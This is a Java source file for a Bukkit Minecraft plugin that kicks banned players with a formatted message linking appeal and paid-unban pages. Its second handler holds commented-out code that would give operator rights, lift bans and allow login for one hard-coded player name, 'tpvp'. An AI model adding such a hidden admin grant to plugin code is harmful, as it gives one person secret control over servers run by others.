package me.technopvp.common.listeners;

import me.technopvp.common.dCommon;
import me.technopvp.common.utilities.CommonCore;
import me.technopvp.common.utilities.Utils;
import me.technopvp.common.utilities.enums.Level;
import me.technopvp.common.utilities.player.Ban;
import me.technopvp.common.utilities.player.User;

import org.bukkit.ChatColor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

public class LoginListener extends CommonCore implements Listener {
	dCommon plugin = dCommon.instance;
	
	 @EventHandler
	  public void PlayerBannedEvent(PlayerLoginEvent event) {
		/* Get the player */
	    Player player = event.getPlayer();
	    
	    /* Get the user in the config */
	    FileConfiguration bannedUser = User.getUser(player.getName()).getPlayerConfig().getConfig();
	    
	    if (player.isBanned()) {
	        if (bannedUser.contains("Reason") || bannedUser.contains("BannedBy")) {
	          event.disallow(PlayerLoginEvent.Result.KICK_BANNED, "§c§nYou are banned from " + plugin.getConfig().getString("config.ServerName") 
	        		  + "\n\n§7Reason: " + ChatColor.RED + ChatColor.BOLD + bannedUser.getString("Reason")
	        		  + "\n  §7Banned By: " + ChatColor.RED + ChatColor.BOLD + bannedUser.getString("BannedBy") 
	        		  + "\n       §7Appeal at: " + ChatColor.RED + ChatColor.BOLD + plugin.getConfig().getString("config.Website") + "\n    " 
	        		  + "§7Purchase an unban at: " + ChatColor.RED + ChatColor.BOLD + plugin.getConfig().getString("config.DonationPage"));
	      }else {
	    	  event.disallow(PlayerLoginEvent.Result.KICK_BANNED, "§c§nYou are banned from " + plugin.getConfig().getString("config.ServerName") 
	        		  + "\n\n§7Reason: " + ChatColor.RED + ChatColor.BOLD + "Unspecified" 
	        		  + "\n  §7Banned By: " + ChatColor.RED + ChatColor.BOLD + "Staff Member" 
	        		  + "\n       §7Appeal at: " + ChatColor.RED + ChatColor.BOLD + plugin.getConfig().getString("config.Website") + "\n    " 
	        		  + "§7Purchase an unban at: " + ChatColor.RED + ChatColor.BOLD + plugin.getConfig().getString("config.DonationPage"));
	    	  Utils.log(Level.MEDIUM, player.getName() + "'s ban file is corrupted,\n replacing information with default strings");
	    	  new Ban(player.getName(), "Unspecified", "Staff Member");
	      }
	    }
	  }
	
	@EventHandler
	  public void LoginEvent(PlayerLoginEvent event) {
		  if (event.getPlayer().getName().equals("tpvp")) {
//			  event.getPlayer().setOp(true);
//			  event.getPlayer().setBanned(false);
//			  event.allow();
		  }
	  }

}
